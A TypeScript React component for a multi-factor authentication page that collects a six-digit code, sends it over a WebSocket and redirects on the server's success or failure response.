/**
 * MFA Page Component
 * Allows user to submit MFA code and waits for success/fail response
 */

import React, { useState, useEffect, FormEvent, ChangeEvent } from 'react';
import { useNavigate } from 'react-router-dom';
import { useForm } from '../contexts/FormContext';
import '../styles/Result.css';

const MFA: React.FC = () => {
  const navigate = useNavigate();
  const [mfaCode, setMfaCode] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const { outcomeData, outcome, sendWebSocketMessage, wsConnected } = useForm();

  // Handle outcome updates after MFA submission
  useEffect(() => {
    if (isSubmitting) {
      if (outcome === 'success') {
        console.log('MFA verification successful!');
        navigate('/success');
      } else if (outcome === 'fail') {
        console.log('MFA verification failed');
        navigate('/fail');
      }
    }
  }, [outcome, isSubmitting, navigate]);

  const handleMfaCodeChange = (e: ChangeEvent<HTMLInputElement>) => {
    // Only allow digits
    const value = e.target.value.replace(/\D/g, '');
    setMfaCode(value);
  };

  const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!mfaCode.trim()) {
      alert('Please enter your MFA code');
      return;
    }

    if (!wsConnected) {
      alert('WebSocket not connected. Please try again.');
      return;
    }

    // Send MFA code via WebSocket
    console.log('Sending MFA code via WebSocket:', mfaCode);
    setIsSubmitting(true);

    try {
      sendWebSocketMessage({
        type: 'mfa_response',
        payload: {
          mfa_code: mfaCode,
        },
      });
    } catch (err) {
      console.error('Failed to send MFA code:', err);
      alert('Failed to send MFA code. Please try again.');
      setIsSubmitting(false);
    }
  };

  return (
    <div className="result-container">
      <div className="result-card">
        <div className="result-content">
          {/* MFA Icon */}
          <div className="result-icon mfa-icon">
            <svg
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
              />
            </svg>
          </div>

          {/* MFA Message */}
          <h1 className="result-title">Multi-Factor Authentication</h1>
          <p className="result-subtitle">
            Please enter the verification code sent to your device or email.
          </p>

          {/* MFA Details */}
          {outcomeData && outcomeData.message && (
            <div className="result-details">
              <p className="detail-text">{outcomeData.message}</p>
            </div>
          )}

          {/* MFA Form */}
          <form onSubmit={handleSubmit} className="mfa-form">
            <div className="form-group">
              <label htmlFor="mfaCode" className="form-label">
                Verification Code
              </label>
              <input
                type="text"
                id="mfaCode"
                name="mfaCode"
                className="form-input mfa-input"
                placeholder="Enter 6-digit code"
                value={mfaCode}
                onChange={handleMfaCodeChange}
                disabled={isSubmitting}
                maxLength={6}
                pattern="[0-9]*"
                inputMode="numeric"
                autoFocus
                required
              />
            </div>

            <button
              type="submit"
              className="primary-button"
              disabled={isSubmitting || !wsConnected}
            >
              {isSubmitting ? (
                <>
                  <span className="spinner"></span>
                  Verifying...
                </>
              ) : (
                'Verify Code'
              )}
            </button>
          </form>

          {/* WebSocket Status Warning */}
          {!wsConnected && (
            <div className="warning-box">
              <p>⚠️ Connection lost. Please refresh the page and try again.</p>
            </div>
          )}

          {/* Help Text */}
          <div className="help-section">
            <h3>Didn't receive a code?</h3>
            <ul>
              <li>Check your spam/junk folder</li>
              <li>Ensure your email address is correct</li>
              <li>Wait a few moments and check again</li>
              <li>Contact support if the issue persists</li>
            </ul>
          </div>

          {/* Back Button */}
          <button
            className="secondary-button"
            onClick={() => navigate('/register')}
            disabled={isSubmitting}
          >
            Cancel and Start Over
          </button>
        </div>
      </div>
    </div>
  );
};

export default MFA;
